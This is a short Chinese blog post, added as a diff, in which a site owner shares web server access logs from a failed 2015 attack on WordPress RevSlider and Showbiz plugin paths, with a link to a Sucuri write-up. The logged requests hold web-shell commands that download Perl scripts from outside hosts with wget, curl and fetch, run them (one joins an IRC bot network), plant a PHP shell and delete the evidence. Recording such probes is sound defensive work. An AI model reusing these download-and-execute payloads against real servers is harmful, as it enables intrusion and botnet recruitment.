@@ -1,0 +1,52 @@
+---
+layout: post
+title:  "37.187.248.45又是什么鬼"
+date:   2015-3-20 00:48:57 +0800
+categories: 技术
+---
+
+这回我没事去看了看[http://identerprise.co.kr/css/qtalk.txt](http://identerprise.co.kr/css/qtalk.txt)这个文件，绝对不信这是蜘蛛了……
+
+参考文章：[RevSlider Vulnerability Leads To Massive WordPress SoakSoak Compromise](http://blog.sucuri.net/2014/12/revslider-vulnerability-leads-to-massive-wordpress-soaksoak-compromise.html)
+
+<!--more-->
+    37.187.248.45 [20/Mar/2015:00:14:03 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php 404 0.014 0.014 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:14:03 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/spid2.php 404 0.013 0.013 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:14:02 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/byroe.jpg;curl%20-O%20http://identerprise.co.kr/css/byroe.jpg;fetch%20http://identerprise.co.kr/css/byroe.jpg;mv%20byroe.jpg%20spid2.php; 404 0.009 0.009 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:14:01 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/b.txt;curl%20-O%20http://identerprise.co.kr/css/b.txt;fetch%20http://identerprise.co.kr/css/b.txt;perl%20b.txt;rm%20-rf%20b.txt* 404 0.017 0.017 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:14:01 +0800] /wp-content/plugins/showbiz/temp/update_extract/showbiz/spid2.php 404 0.009 0.009 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq34
+      37.187.248.45 [20/Mar/2015:00:13:58 +0800] /wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/byroe.jpg;curl%20-O%20http://identerprise.co.kr/css/byroe.jpg;fetch%20http://identerprise.co.kr/css/byroe.jpg;mv%20byroe.jpg%20spid2.php; 404 0.015 0.015 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:56 +0800] /wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://wawalo.wap.sh/bot.txt;curl%20-O%20http://wawalo.wap.sh/bot.txt;fecth%20http://wawalo.wap.sh/bot.txt;perl%20bot.txt%20irc.ayochat.or.id;rm%20-rf%20bot.txt* 404 0.015 0.015 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:57 +0800] /wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/b.txt;curl%20-O%20http://identerprise.co.kr/css/b.txt;fetch%20http://identerprise.co.kr/css/b.txt;perl%20b.txt;rm%20-rf%20b.txt* 404 0.013 0.013 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:56 +0800] /wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/qtalk.txt;curl%20-O%20http://identerprise.co.kr/css/qtalk.txt;fetch%20http://identerprise.co.kr/css/qtalk.txt;perl%20qtalk.txt;rm%20-rf%20qtalk.txt* 404 0.012 0.012 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:54 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://wawalo.wap.sh/bot.txt;curl%20-O%20http://wawalo.wap.sh/bot.txt;fecth%20http://wawalo.wap.sh/bot.txt;perl%20bot.txt%20irc.ayochat.or.id;rm%20-rf%20bot.txt* 404 0.013 0.013 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:52 +0800] /blog/post/18/wp-content/plugins/showbiz/temp/update_extract/showbiz/nino.php?cmd=wget%20http://identerprise.co.kr/css/qtalk.txt;curl%20-O%20http://identerprise.co.kr/css/qtalk.txt;fetch%20http://identerprise.co.kr/css/qtalk.txt;perl%20qtalk.txt;rm%20-rf%20qtalk.txt* 404 0.009 0.009 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq34
+      37.187.248.45 [20/Mar/2015:00:13:52 +0800] /blog/post/18/wp-admin/admin-ajax.php 404 0.015 0.015 4477 
+    www.jithee.name POST HTTP/1.0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0" yq26
+      37.187.248.45 [20/Mar/2015:00:13:49 +0800] /blog/post/18/wp-content/plugins/revslider/temp/update_extract/revslider/nino.php 404 0.014 0.014 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:48 +0800] /blog/post/18/wp-content/plugins/revslider/temp/update_extract/revslider/spid.php 404 0.013 0.013 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:48 +0800] /wp-admin/admin-ajax.php 404 0.016 0.016 4477 
+    www.jithee.name POST HTTP/1.0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0" yq26
+      37.187.248.45 [20/Mar/2015:00:13:45 +0800] /wp-content/plugins/revslider/temp/update_extract/revslider/nino.php 404 0.013 0.013 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:17 +0800] /blog/post/18/wp-content/plugins/revslider/temp/update_extract/revslider/nino.php?cmd=wget%20http://identerprise.co.kr/css/qtalk.txt;curl%20-O%20http://identerprise.co.kr/css/qtalk.txt;fetch%20http://identerprise.co.kr/css/qtalk.txt;perl%20qtalk.txt;rm%20-rf%20qtalk.txt* 404 0.014 0.014 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
+      37.187.248.45 [20/Mar/2015:00:13:14 +0800] /wp-content/plugins/revslider/temp/update_extract/revslider/nino.php?cmd=wget%20http://identerprise.co.kr/css/b.txt;curl%20-O%20http://identerprise.co.kr/css/b.txt;fetch%20http://identerprise.co.kr/css/b.txt;perl%20b.txt;rm%20-rf%20b.txt* 404 0.009 0.009 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq34
+      37.187.248.45 [20/Mar/2015:00:13:13 +0800] /wp-content/plugins/revslider/temp/update_extract/revslider/nino.php?cmd=wget%20http://wawalo.wap.sh/bot.txt;curl%20-O%20http://wawalo.wap.sh/bot.txt;fecth%20http://wawalo.wap.sh/bot.txt;perl%20bot.txt%20irc.ayochat.or.id;rm%20-rf%20bot.txt* 404 0.009 0.009 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq34
+      37.187.248.45 [20/Mar/2015:00:13:09 +0800] /wp-content/plugins/revslider/temp/update_extract/revslider/nino.php?cmd=wget%20http://identerprise.co.kr/css/qtalk.txt;curl%20-O%20http://identerprise.co.kr/css/qtalk.txt;fetch%20http://identerprise.co.kr/css/qtalk.txt;perl%20qtalk.txt;rm%20-rf%20qtalk.txt* 404 0.699 0.699 4477 
+    www.jithee.name GET HTTP/1.0 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" yq26
